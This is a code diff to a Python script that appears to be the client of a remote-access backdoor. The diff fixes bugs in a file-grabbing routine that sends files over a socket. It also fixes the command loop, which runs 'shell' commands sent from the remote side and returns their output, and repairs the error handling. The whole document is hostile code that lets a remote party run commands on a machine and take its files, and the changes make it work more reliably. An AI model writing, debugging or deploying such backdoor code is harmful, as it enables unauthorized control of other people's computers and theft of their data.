@@ -60,10 +60,10 @@ def transfergrab(s,path):
 		f=open(path,'rb')
 		f.seek(0)
 		packet=f.read(1024)
-		while packet!='':
-			s.send(packet.encode())
+		while packet:
+			s.send(packet)
 			packet=f.read(1024)
-			s.send(("DONE").encode())
+		s.send(("DONE").encode())
 		f.close()
 	else:
 		msg="The File Doesn't Exist"
@@ -110,20 +110,17 @@ def connection():
 	global s
 
 	while True:
-        
+
 		command=s.recv(1024)
 		command=command.decode()
-            
-        
-                
+
 		if 'grab' in command:
 			grab,path=command.split('*')
 			try:
 				transfergrab(s,path)
-			except e:
-                		s.send(e.encode())
-                		pass
-        
+			except:
+				s.send("ERROR".encode())
+			
 		elif 'upload' in command:
 			transferupload(s,command)
 
@@ -133,8 +130,7 @@ def connection():
 			os.chdir(directory) 
 			s.send(("[+] CWD Is " + os.getcwd()).encode())
 			s.send(("DONE").encode())
-       
-                            
+
 		elif 'shell' in command:
 			shell,query = command.split('*')
 			query=query.split()
@@ -146,6 +142,8 @@ def connection():
 					s.send(("DONE").encode())
 				elif stderr:
 					s.send(stderr)
+					s.send(("DONE").encode())
+				else:
 					s.send(("DONE").encode())
 			except:
 				s.send("COMMAND_NOT_FOUND".encode())
